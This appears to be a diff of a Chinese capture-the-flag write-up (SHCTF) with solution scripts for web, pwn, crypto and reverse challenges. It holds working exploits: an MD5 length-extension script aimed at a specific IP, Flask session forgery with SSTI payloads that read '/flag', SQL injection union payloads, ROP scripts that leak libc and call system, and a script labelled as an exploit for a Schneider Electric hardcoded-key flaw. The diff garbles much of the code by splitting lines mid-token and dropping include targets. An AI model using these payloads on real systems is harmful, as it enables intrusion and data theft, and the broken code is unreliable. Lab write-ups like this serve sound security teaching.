@@ -91,9 +91,11 @@ https://github.com/lmammino/jwt-cracker
 
 dickle
 
-在反序列化过程中，如果 pickle 模块遇到一个表示类的标记，它会调用 find_class 方法来查找和创建相应的类实例。
+在反序列化过程中，如果 pickle 模块遇到一个表示类的标记，它会调用 find_
+class 方法来查找和创建相应的类实例。
 
-find_class 方法将识别到的 module 和 name 取决于 reduce 方法返回的内容。
+find_
+class 方法将识别到的 module 和 name 取决于 reduce 方法返回的内容。
 
 module是类的模块名，例如 “os“。name是类名，例如 “system“
 
@@ -101,7 +103,9 @@ module是类的模块名，例如 “os“。name是类名，例如 “system“
 
 本地运行加一个打印出find_class的结果
 
-在反序列化过程中， pickle 使用 find_class 方法来定位和导入必要的类或函数。由于 pickle 记录的是 posix.system，因此 find_class 会从 posix 模块中导入 system 函数，而不是从 os 模块中导入。
+在反序列化过程中， pickle 使用 find_
+class 方法来定位和导入必要的类或函数。由于 pickle 记录的是 posix.system，因此 find_
+class 会从 posix 模块中导入 system 函数，而不是从 os 模块中导入。
 
 所以可以用os.system
 
@@ -259,7 +263,8 @@ def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C:�
     hash_pieces = get_init_values(A, B, C, D)[:]
     for chunk_ofst in range(0, len(message), 64):
         a, b, c, d = hash_pieces
-        chunk = message[chunk_ofst:chunk_ofst + 64]
+        chunk = message[chunk_ofst:
+chunk_ofst + 64]
         for i in range(64):
             f = functions[i](b, c, d)
             g = index_functions[i](i)
@@ -274,7 +279,8 @@ def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C:�
 
 def md5_to_hex(digest: int) -> str:
     raw = digest.to_bytes(16, byteorder='little')
-    return '{:032x}'.format(int.from_bytes(raw, byteorder='big'))
+    return '{:
+032x}'.format(int.from_bytes(raw, byteorder='big'))
 
 def get_md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> str:
     return md5_to_hex(md5(message, A, B, C, D))
@@ -284,7 +290,8 @@ def md5_attack(message: bytes, A: int = 0x67452301, B: int = 0xefcdab8
     hash_pieces = get_init_values(A, B, C, D)[:]
     for chunk_ofst in range(0, len(message), 64):
         a, b, c, d = hash_pieces
-        chunk = message[chunk_ofst:chunk_ofst + 64]
+        chunk = message[chunk_ofst:
+chunk_ofst + 64]
         for i in range(64):
             f = functions[i](b, c, d)
             g = index_functions[i](i)
@@ -327,7 +334,8 @@ def get_md5_attack_materials(origin_msg: bytes, key_len: int, real_hash: s
 
     """
     init_values = get_init_values_from_hash_str(real_hash)
-    # print(['{:08x}'.format(x) for x in init_values])
+    # print(['{:
+08x}'.format(x) for x in init_values])
     # 只知道key的长度，不知道key的具体内容时，任意填充key的内容
     fake_key: bytes = bytes([0xff for _ in range(key_len)])
     # 计算出加了append_data后的真实填充数据
@@ -364,12 +372,14 @@ def session_encode(session_cookie_structure, secret_key):
         si = SecureCookieSessionInterface()
         s = si.get_signing_serializer(app)
         return s.dumps(session_cookie_structure)
-    except Exception as e:
+    
+except Exception as e:
         return "[Encoding error] {}".format(e)
 
 def req_index(url, cookie):
     # headers = {"Cookie": "session=" + cookie}
-    cookies = {"session":cookie}
+    cookies = {"session":
+cookie}
     r = requests.get(url, cookies=cookies).text
     # print(r)
     if '签到成功' not in r:
@@ -390,11 +400,15 @@ def req_login(url):
 def hash_Attack(md5_value, key_len, data, attack_data):
     attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)
     # print(data)
-    res = {"username":attack_data, "msg":attack_materials['attack_fake_msg'][:-len(attack_data)], "sign":attack_materials['attack_hash_value'].encode()}
+    res = {"username":
+attack_data, "msg":
+attack_materials['attack_fake_msg'][:-len(attack_data)], "sign":
+attack_materials['attack_hash_value'].encode()}
     return res
 
 if __name__ == '__main__':
-    url = "http://210.44.150.15:49982/"
+    url = "http://210.44.150.15:
+49982/"
     cookie = req_login(url+'login')
     users = req_user(url+'users')
     secret_key = "Th1s_is_5ecr3t_k3y"
@@ -414,10 +428,14 @@ https://github.com/noraj/flask-session-cookie-manager
 
 session伪造
 
-D:toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py decode -c "eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZvZ8IQ.B9Q1a7gFQvzs4Q3bGldXuiGHULg" -s "0day_joker"
-D:toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls").read()}}', 'is_admin': 1}}"
-D:toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls /").read()}}', 'is_admin': 1}}"
-D:toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("cat /flag").read()}}', 'is_admin': 1}}"
+D:
+toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py decode -c "eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZvZ8IQ.B9Q1a7gFQvzs4Q3bGldXuiGHULg" -s "0day_joker"
+D:
+toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls").read()}}', 'is_admin': 1}}"
+D:
+toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls /").read()}}', 'is_admin': 1}}"
+D:
+toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("cat /flag").read()}}', 'is_admin': 1}}"
 
 自助查询
 
@@ -441,7 +459,8 @@ ezorw
 
 程序未开启canary并存在溢出，但是开启了pie保护
 
-思路:利用fd=0和close(fd)来关闭标准输入流，然后使程序返回main中执行open打开flag，通过read和puts将flag读出并打印
+思路:
+利用fd=0和close(fd)来关闭标准输入流，然后使程序返回main中执行open打开flag，通过read和puts将flag读出并打印
 
 from pwn import *
 context.log_level = 'debug'
@@ -567,7 +586,8 @@ for i in range(0,0x30):
             p.close()
             flag += chr(j)
             break
-        except:
+        
+except:
             p.close()
     print(flag)
 
@@ -619,7 +639,8 @@ payload=b'A'*0x48+b'A'*4+p32(puts_plt)+p32(main)+p32(puts_got)
 send_data=b'{"name":"'+payload+b'","age":21}'
 ru("How to send data?")
 sl(send_data)
-ru("age:134549548n")
+ru("age:
+134549548n")
 libcbase=u32(io.recv()[0:4])-libc.sym['puts']
 lg("libcbase")
 system=libcbase+libc.sym['system']
@@ -701,7 +722,7 @@ Babytea
 
 明显的tea特征  直接写解密脚本
 
-#include <iostream>
+#include 
 #include <stdint.h>
 void decrypt (uint32_t* v, uint32_t* k) {
     uint32_t v0=v[0], v1=v[1], i; 
@@ -732,7 +753,7 @@ int main(){
 去花
 
 /*exp 如下*/
-#include<iostream>
+#include
 using namespace std;
 int main() {
     char tmp=0;
@@ -793,7 +814,8 @@ def solve_dp_leak(e,dp,n,c):
         m = pow(c,d,n)
         flag = long_to_bytes(m)
         return flag
-    except:
+    
+except:
         pass
 
 n = 64921145375403083545531864956984072151341856682908111104267811008333409469629440124743589471022387528791249789776590881987854906662741019934835451842451919000617925805744632898434110555454137681326076564563593722826588259739946684132723368750061113163201190149766894752415770470935877082883818815783228793301
@@ -802,11 +824,6 @@ e = 1039743120668324617408742378768011653641207981199791545288831
 dp = 8095244708261074732722010639332938624538458336137147330884467084239259958828296552002478065663880970649018267223959758006546150783644433676150589502506131
 flag = solve_dp_leak(e,dp,n,c)
 print(flag)
-```
-
-
-
-```
 from Crypto.Util.number import *
 import gmpy2
 flag = b'SHCTF{********}'
@@ -823,11 +840,6 @@ print(f'c = {c}')
 n = 101194231761192803646875794770841105131876105333404505987513576849142365482512109876401629071314564545841743473668262668053559550015874646299248232349238400201145583346187330958825878235324968882794481192056169683711007095999439320830763275487477094590502701333963154552470777678553556993349171608134555815527
 c = 54067443511581567434123971345564905390315631873898717856316286990552318113901362505672245448553258416669456882532743580961176229271906817289588426185966004215569829572814038485471312399063659287164712291139771809733004385057875146223151700601326161190474536508680332925332614914475852998934930375151571163346
 '''
-```
-
-
-
-```
 import libnum
 n = 101194231761192803646875794770841105131876105333404505987513576849142365482512109876401629071314564545841743473668262668053559550015874646299248232349238400201145583346187330958825878235324968882794481192056169683711007095999439320830763275487477094590502701333963154552470777678553556993349171608134555815527
 c = 54067443511581567434123971345564905390315631873898717856316286990552318113901362505672245448553258416669456882532743580961176229271906817289588426185966004215569829572814038485471312399063659287164712291139771809733004385057875146223151700601326161190474536508680332925332614914475852998934930375151571163346
@@ -840,11 +852,6 @@ f = f.monic()
 root = f.small_roots(X=2 ** (39 * 8),beta=0.9,epsilon=0.03)
 print(root)
 print(libnum.n2s(int(root[0])))
-```
-
-
-
-```
 from Crypto.Util.number import *
 from gmpy2 import *
 
@@ -869,11 +876,6 @@ d = invert(e, phi)
 m = pow(c, d, n)
 flag = long_to_bytes(m)
 print(flag)
-```
-
-
-
-```
 from Crypto.Util.number import *
 import sys
 
@@ -932,15 +934,10 @@ def find(ph, qh, pl, ql):
             find(ph + "1", qh + "1", "1" + pl, "1" + ql)
 
 find("1", "1", "1", "1")
-#p = 64760524083545528318139240449356269097871629401328435356643510319660757701117
-#q = 109947782034870726628911928816041880655659770652764045401662566933641952899777
+    #p = 64760524083545528318139240449356269097871629401328435356643510319660757701117
+    #q = 109947782034870726628911928816041880655659770652764045401662566933641952899777
 #-908f-7c002c687387
-```
-
-
-
-```
-#sage
+    #sage
 from Crypto.Util.number import *
 
 p = 64760524083545528318139240449356269097871629401328435356643510319660757701117
@@ -958,12 +955,7 @@ G = P*d
 x = G.xy()[0]
 flag = long_to_bytes(int(x))
 print(flag)
-#a67b2a9b-0542-4646
-```
-
-
-
-```
+    #a67b2a9b-0542-4646
 from Crypto.Util.number import *
 
 p =  9799485259524549113003780400336995829253375211044694607315372450399356814285244762186468904824132005209991983177601498069896166228214442123763065076327679
@@ -984,11 +976,6 @@ for i in range(292):
     m = long_to_bytes(int(mm-i))
     if m.endswith(b'}'):
         print(m)
-```
-
-
-
-```
 #!/usr/bin/env python3
 """
 Schneider Electric EcoStruxure Operator Terminal Expert Hardcoded Cryptographic Key Information Disclosure Vulnerability
@@ -1114,11 +1101,6 @@ def main():
 
 if __name__ == '__main__':
     main()
-```
-
-
-
-```
 import os
 import itertools
 import zlib
@@ -1132,7 +1114,8 @@ def try_decompress(data):
     try:
         decompressed_data = zlib.decompress(data, -zlib.MAX_WBITS)
         return decompressed_data
-    except zlib.error:
+    
+except zlib.error:
         return None
 
 def calculate_crc32(data):
@@ -1189,17 +1172,7 @@ def main():
 
 if __name__ == "__main__":
     main()
-```
-
-
-
-```
 S.,H.,C.,T.,F.,Open Curly Bracket,B.,L.,four,C.,K.,Underscore,M.,Y.,seven,H.,colon,five,H.,four,N.,H.,three,Close Curly Bracket
-```
-
-
-
-```
 import zlib
 
 flag=''
@@ -1217,17 +1190,7 @@ for target_crc in crc_list:
                     break
 
 print('解密得到:'+flag)
-```
-
-
-
-```
 欢迎登录admin!这里是你的flag: SHCTF{y0u_v3r1F1ed_Y0U_aRe_yOU_xxxxxxxxxxxx}
-```
-
-
-
-```
 import flask
 import random
 from flask import Flask, request, render_template, send_file
@@ -1264,11 +1227,6 @@ def init():
 
 init()
 app.run(debug=True)
-```
-
-
-
-```
 import random
 
 first_num = int(input(""))
@@ -1279,11 +1237,6 @@ for i in range(1000000,9999999,1):
         second_num = random.randint(1000000000,9999999999)
         print("second_num: " + str(second_num))
         exit()
-```
-
-
-
-```
 def check_sign(sign, username, msg, salt):
     if sign == md5(salt + msg + username):
         return True
@@ -1300,11 +1253,6 @@ def index():
         sign_users[username.decode()] = 1
         return "签到成功"
     return redirect("/login")
-```
-
-
-
-```
 import hashlib
 import math
 from typing import Any, Dict, List
@@ -1354,7 +1302,8 @@ def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C:�
     hash_pieces = get_init_values(A, B, C, D)[:]
     for chunk_ofst in range(0, len(message), 64):
         a, b, c, d = hash_pieces
-        chunk = message[chunk_ofst:chunk_ofst + 64]
+        chunk = message[chunk_ofst:
+chunk_ofst + 64]
         for i in range(64):
             f = functions[i](b, c, d)
             g = index_functions[i](i)
@@ -1369,7 +1318,8 @@ def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C:�
 
 def md5_to_hex(digest: int) -> str:
     raw = digest.to_bytes(16, byteorder='little')
-    return '{:032x}'.format(int.from_bytes(raw, byteorder='big'))
+    return '{:
+032x}'.format(int.from_bytes(raw, byteorder='big'))
 
 def get_md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> str:
     return md5_to_hex(md5(message, A, B, C, D))
@@ -1379,7 +1329,8 @@ def md5_attack(message: bytes, A: int = 0x67452301, B: int = 0xefcdab8
     hash_pieces = get_init_values(A, B, C, D)[:]
     for chunk_ofst in range(0, len(message), 64):
         a, b, c, d = hash_pieces
-        chunk = message[chunk_ofst:chunk_ofst + 64]
+        chunk = message[chunk_ofst:
+chunk_ofst + 64]
         for i in range(64):
             f = functions[i](b, c, d)
             g = index_functions[i](i)
@@ -1422,7 +1373,8 @@ def get_md5_attack_materials(origin_msg: bytes, key_len: int, real_hash: s
 
     """
     init_values = get_init_values_from_hash_str(real_hash)
-    # print(['{:08x}'.format(x) for x in init_values])
+    # print(['{:
+08x}'.format(x) for x in init_values])
     # 只知道key的长度，不知道key的具体内容时，任意填充key的内容
     fake_key: bytes = bytes([0xff for _ in range(key_len)])
     # 计算出加了append_data后的真实填充数据
@@ -1459,12 +1411,14 @@ def session_encode(session_cookie_structure, secret_key):
         si = SecureCookieSessionInterface()
         s = si.get_signing_serializer(app)
         return s.dumps(session_cookie_structure)
-    except Exception as e:
+    
+except Exception as e:
         return "[Encoding error] {}".format(e)
 
 def req_index(url, cookie):
     # headers = {"Cookie": "session=" + cookie}
-    cookies = {"session":cookie}
+    cookies = {"session":
+cookie}
     r = requests.get(url, cookies=cookies).text
     # print(r)
     if '签到成功' not in r:
@@ -1485,11 +1439,15 @@ def req_login(url):
 def hash_Attack(md5_value, key_len, data, attack_data):
     attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)
     # print(data)
-    res = {"username":attack_data, "msg":attack_materials['attack_fake_msg'][:-len(attack_data)], "sign":attack_materials['attack_hash_value'].encode()}
+    res = {"username":
+attack_data, "msg":
+attack_materials['attack_fake_msg'][:-len(attack_data)], "sign":
+attack_materials['attack_hash_value'].encode()}
     return res
 
 if __name__ == '__main__':
-    url = "http://210.44.150.15:49982/"
+    url = "http://210.44.150.15:
+49982/"
     cookie = req_login(url+'login')
     users = req_user(url+'users')
     secret_key = "Th1s_is_5ecr3t_k3y"
@@ -1500,38 +1458,17 @@ if __name__ == '__main__':
             res2 = session_encode(res, secret_key)
             # time.sleep(1)
             r = req_index(url, res2)
-```
-
-
-
-```
-D:toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py decode -c "eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZvZ8IQ.B9Q1a7gFQvzs4Q3bGldXuiGHULg" -s "0day_joker"
-D:toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls").read()}}', 'is_admin': 1}}"
-D:toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls /").read()}}', 'is_admin': 1}}"
-D:toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("cat /flag").read()}}', 'is_admin': 1}}"
-```
-
-
-
-```
+D:
+toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py decode -c "eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZvZ8IQ.B9Q1a7gFQvzs4Q3bGldXuiGHULg" -s "0day_joker"
+D:
+toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls").read()}}', 'is_admin': 1}}"
+D:
+toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls /").read()}}', 'is_admin': 1}}"
+D:
+toolsexploitpythonflask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("cat /flag").read()}}', 'is_admin': 1}}"
 SELECT username,password FROM users WHERE id = ("
-```
-
-
-
-```
 -1") union select 1,scretdata from ctf.flag
-```
-
-
-
-```
 -1") union select 1,column_comment from information_schema.columns
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'debug'
 
@@ -1551,11 +1488,6 @@ p.send(payload)
 p.recvline()
 
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 p1 = remote('ip',port)
 p2 = remote('ip',port)
@@ -1564,11 +1496,6 @@ time.sleep(1)
 p2.send(p64(0x404120))
 p2.close()
 p1.interactive()
-```
-
-
-
-```
 push 0x67616c66//压入flag文件名到栈中
  mov rdi,rsp
  xor rsi,rsi
@@ -1590,11 +1517,6 @@ push 0x67616c66//压入flag文件名到栈中
  mov rdx,0x10
  mov rax,0
  syscall//Loop会调用read读取用户输入
-```
-
-
-
-```
 from pwn import *
 from tqdm import tqdm
 
@@ -1638,21 +1560,17 @@ for i in range(0,0x30):
             p.close()
             flag += chr(j)
             break
-        except:
+        
+except:
             p.close()
     print(flag)
-```
-
-
-
-```
 from pwn import *
 from ctypes import *
 from struct import pack
 banary = "./pwn"
 elf = ELF(banary)
 libc = ELF("./libc.so.6")
-#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
+    #libc=ELF("/lib/i386-linux-gnu/libc.so.6")
 ip = ''
 port = 0
 local = 1
@@ -1662,7 +1580,7 @@ else:
     io = remote(ip, port)
 
 context(log_level = 'debug', os = 'linux', arch = 'amd64')
-#context(log_level = 'debug', os = 'linux', arch = 'i386')
+    #context(log_level = 'debug', os = 'linux', arch = 'i386')
 
 def dbg():
     gdb.attach(io)
@@ -1690,7 +1608,8 @@ payload=b'A'*0x48+b'A'*4+p32(puts_plt)+p32(main)+p32(puts_got)
 send_data=b'{"name":"'+payload+b'","age":21}'
 ru("How to send data?")
 sl(send_data)
-ru("age:134549548n")
+ru("age:
+134549548n")
 libcbase=u32(io.recv()[0:4])-libc.sym['puts']
 lg("libcbase")
 system=libcbase+libc.sym['system']
@@ -1701,17 +1620,12 @@ send_data=b'{"name":"'+payload+b'","age":21}'
 sl(send_data)
 
 ia()
-```
-
-
-
-```
 from pwn import *
 from ctypes import *
 from struct import pack
 banary = "./pwn"
 elf = ELF(banary)
-#libc = ELF("./libc.so.6")
+    #libc = ELF("./libc.so.6")
 libc=ELF("/lib/i386-linux-gnu/libc.so.6")
 ip = ''
 port = 0
@@ -1722,7 +1636,7 @@ else:
     io = remote(ip, port)
 
 context(log_level = 'debug', os = 'linux', arch = 'amd64')
-#context(log_level = 'debug', os = 'linux', arch = 'i386')
+    #context(log_level = 'debug', os = 'linux', arch = 'i386')
 
 def dbg():
     gdb.attach(io)
@@ -1750,11 +1664,6 @@ ru("How to send data?")
 sl(send_data)
 
 ia()
-```
-
-
-
-```
 // 必须写在 Java 虚拟机中 
 Java.perform(function() {
     let MainActivity = Java.use("com.example.test.MainActivity");
@@ -1765,13 +1674,8 @@ MainActivity["check"].implementation = function (str) {
     return 1;
 };
 })
-```
-
-
-
-```
-#include <iostream>
-#include <stdint.h>
+    #include 
+    #include <stdint.h>
 void decrypt (uint32_t* v, uint32_t* k) {
     uint32_t v0=v[0], v1=v[1], i; 
     uint32_t delta=0x61C88747;  
@@ -1795,13 +1699,8 @@ int main(){
     puts((char*)enc);
 
 }
-```
-
-
-
-```
 /*exp 如下*/
-#include<iostream>
+    #include
 using namespace std;
 int main() {
     char tmp=0;
@@ -1821,17 +1720,7 @@ int main() {
  /*
  SHCTF{keY_is_hua_fffllllaggg!}
  */
-```
-
-
-
-```
 obj.secretKey = "[f#fLw)??Pz?#9w)Du[ks[q[#w4D?4P4UJf,kU[f.rDkfwrDtq...)?J.#rP4[qrPDJkkJ|.9J|qffU?k|D4P4P[wkk.)k?JUJ[k#9kww[r??wUfw|PkrPUf.P#f.P#.PwJ4f4q.PU4UPDr9.[9fJ#PqP)cDDffJPDrJ.J4qPP[r[.JfJ4f|?U9#";
-```
-
-
-
-```
 def decode(ciphertext):
 
     result = []
@@ -1850,11 +1739,6 @@ plaintext = decode(ciphertext)
 
 print(plaintext)
 # b4c4S20331H3cf208Cb9Tbebc2a83a1a6d4F96b45-8942-8{e55503d5c-1abe-18d99d75fd7e4463978a1a1b2995093d6db9cf922b-332642719-16451c451c512da4ae516a618-f5bf4dc1e10}8844d18-d5dae11b-b5d4da4736fc
-```
-
-
-
-```
 import numpy as np
 from mazelib.solve.ShortestPaths import ShortestPaths
 from mazelib import Maze
@@ -1900,11 +1784,6 @@ for i, j in m.solutions[0]:
     if maze[i][j] != " ":
         print(maze[i][j], end="")
 # SHCTF{81f6ad65-9da6-41ae-bd61-88dea61332f1}
-```
-
-
-
-```
 public byte[] GetData(Context p0){
        byte[] uobyteArray4;
        int i = this;
@@ -1982,11 +1861,6 @@ public byte[] GetData(Context p0){
        }catch(java.lang.reflect.InvocationTargetException e9){
        }
     }
-```
-
-
-
-```
 import java.util.Random;
 
 public class GetFlag {
